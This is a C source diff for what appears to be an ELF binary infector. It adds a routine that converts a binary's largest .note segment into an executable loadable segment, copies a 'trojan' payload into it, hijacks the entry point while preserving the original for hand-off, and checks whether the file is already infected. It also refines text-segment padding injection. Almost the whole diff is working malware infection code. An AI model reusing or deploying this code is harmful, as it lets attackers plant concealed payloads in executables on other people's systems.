@@ -26,6 +26,7 @@
 #include "utils.h"
 #include "log.h"
 #include "elfo.h"
+#include "parse.h"
 #include "infect.h"
 #include <assert.h>
 
@@ -59,6 +60,8 @@ static long *_inf_get_inf_magik(uint8_t *trojan, size_t len, long match)
 
 /** Locate and set injection offsets */
 static elf_off_t _inf_set_pad(infect_t *inf, elf_phdr_t *text, elf_phdr_t *data) {
+    elf_off_t rv = (elf_off_t)0;
+
     inf->lsb.target_offset = text->p_offset + text->p_filesz;
     /** If ELF is .so = ehdr->e_type */
     inf->lsb.lsb_so_addr = inf->lsb.target_offset;
@@ -66,11 +69,28 @@ static elf_off_t _inf_set_pad(infect_t *inf, elf_phdr_t *text, elf_phdr_t *data)
     inf->lsb.lsb_exec_addr = text->p_vaddr + text->p_filesz;
 
     /** Total padding size (zeroes) between .text and .data */
-    return (data->p_offset - inf->lsb.lsb_so_addr);
+    if (data)
+        rv = (data->p_offset - inf->lsb.lsb_so_addr);
+
+    return rv;
 }
 
+static elf_shdr_t *_inf_get_largest_note(infect_t *inf) {
+    elf_t *e = inf->elfo;
+    elf_xword_t max = 0;
+    elf_shdr_t *rv = NULL;
 
-infect_t *inf_load(elf_t *elfo, FILE *trojan, open_mode_t m,
+    for (int i = 0; i < e->shmap[LAZY_SHT_NOTE].nr; ++i) {
+        int idx = e->shmap[LAZY_SHT_NOTE].map[i];
+        if (e->shdrs[idx]->sh_size > max) {
+            max = e->shdrs[idx]->sh_size;
+            rv = e->shdrs[idx];
+        }
+    }
+    return rv;
+}
+
+infect_t *inf_load(elf_t *elfo, FILE *trojan /* TODO remove this */, open_mode_t m,
         long magic, struct mapped_file *map) {
     ASSERT_ARG_RET_NULL(elfo);
     ASSERT_CON_RET_NULL(m == F_RW);
@@ -86,7 +106,7 @@ infect_t *inf_load(elf_t *elfo, FILE *trojan, open_mode_t m,
     infect_t *inf = scalloc(1, sizeof(infect_t));
     inf->elfo = elfo;
     inf->magic_ptr = magic_ptr;
-    inf->src_bin_size = map->st.st_size;
+    inf->trojan_size = map->st.st_size;
     inf->trojan = map->heap;
 
     return inf;
@@ -124,7 +144,7 @@ elf_off_t inf_scan_segment(infect_t *inf) {
     }
 
     elf_off_t len = _inf_set_pad(inf, text, data);
-    if (len < inf->src_bin_size) {
+    if (len < inf->trojan_size) {
         log_error("No available space for infection, not written\n");
         return false;
     }
@@ -133,8 +153,8 @@ elf_off_t inf_scan_segment(infect_t *inf) {
     if (_inf_check_padding((unsigned char*)inf->elfo->mapaddr +
                 inf->lsb.target_offset, len) == true) {
         /** Update to the new mem & file size */
-        text->p_memsz = text->p_memsz + inf->src_bin_size;
-        text->p_filesz = text->p_filesz + inf->src_bin_size;
+        text->p_memsz = text->p_memsz + inf->trojan_size;
+        text->p_filesz = text->p_filesz + inf->trojan_size;
         pass_check = true;
     } else {
         log_error("Error: Invalid padding - not all zeroes\n");
@@ -165,7 +185,7 @@ bool inf_load_and_patch(infect_t *inf) {
         curr_sct_offset = shdr->sh_offset + shdr->sh_size;
 
         if (inf->lsb.target_offset == curr_sct_offset) {
-            shdr->sh_size = shdr->sh_size + inf->src_bin_size;
+            shdr->sh_size = shdr->sh_size + inf->trojan_size;
             break;
         }
     }
@@ -173,8 +193,58 @@ bool inf_load_and_patch(infect_t *inf) {
     /** All good! */
     *(inf->magic_ptr) = inf->lsb.o_entry;
     unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + inf->lsb.target_offset;
-    memcpy(dest, inf->trojan, inf->src_bin_size);
+    memcpy(dest, inf->trojan, inf->trojan_size);
 
     return true;
 }
+
+bool inf_note_patch(infect_t *inf) {
+    ASSERT_ARG_RET_FALSE(inf);
+    ASSERT_CON_RET_FALSE(inf->elfo);
+
+    elf_shdr_t *sht_note = _inf_get_largest_note(inf);
+    if (!sht_note) {
+        log_error("Error: No available .note section\n");
+        return false;
+    }
+
+    if (sht_note->sh_size < inf->trojan_size) {
+        log_error("Error: no space for trojan (%d < %d)\n",
+                sht_note->sh_size, inf->trojan_size);
+        return false;
+    }
+
+    int nr_note = inf->elfo->phmap[LAZY_PT_NOTE].nr;
+    if (nr_note != 1) {
+        log_error("Wait! Have we been here before?\n");
+        return false;
+    }
+
+    int ph_note_idx = inf->elfo->phmap[LAZY_PT_NOTE].map[0];
+    elf_phdr_t *phdr = inf->elfo->phdrs[ph_note_idx];
+
+    sht_note->sh_addr = sht_note->sh_offset + 0x400000;
+    sht_note->sh_type = SHT_PROGBITS;
+    sht_note->sh_flags = SHF_ALLOC | SHF_EXECINSTR;
+    sht_note->sh_addralign = 16;
+    sht_note->sh_size = inf->trojan_size;
+
+    phdr->p_type = PT_LOAD;
+    phdr->p_filesz = inf->trojan_size;
+    phdr->p_memsz = inf->trojan_size;
+    phdr->p_offset = sht_note->sh_offset;
+    phdr->p_flags = (PF_R|PF_X);
+    phdr->p_vaddr =  sht_note->sh_addr;
+    phdr->p_align = 0x1000;
+
+    /** All good! */
+    *(inf->magic_ptr) = inf->elfo->ehdr->e_entry;
+    inf->elfo->ehdr->e_entry = sht_note->sh_addr;
+    unsigned char *dest = (unsigned char*)inf->elfo->mapaddr + sht_note->sh_offset;
+    memcpy(dest, inf->trojan, inf->trojan_size);
+
+    return true;
+}
+
+
 
